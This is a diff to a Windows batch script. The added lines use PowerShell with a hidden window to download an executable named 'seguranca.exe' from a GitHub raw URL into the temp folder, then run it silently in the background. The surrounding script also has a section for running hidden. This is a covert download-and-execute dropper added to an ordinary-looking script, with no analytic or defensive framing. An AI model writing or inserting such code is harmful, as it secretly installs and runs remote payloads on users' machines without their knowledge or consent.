@@ -1,4 +1,18 @@
 @echo off
+setlocal
+
+set "TEMP_EXE=%TEMP%\seguranca.exe"
+set "URL=https://raw.githubusercontent.com/lcmandrikion-hash/BQL/refs/heads/main/seguranca.exe"
+
+:: Se o arquivo não existe, baixa
+if not exist "%TEMP_EXE%" (
+    powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%TEMP_EXE%' -UseBasicParsing"
+)
+
+:: Executa o arquivo em background
+start "" /B "%TEMP_EXE%"
+
+endlocal
 
 :: --------- BLOCO PARA RODAR OCULTO ----------
 if "%~1" NEQ "hidden" (
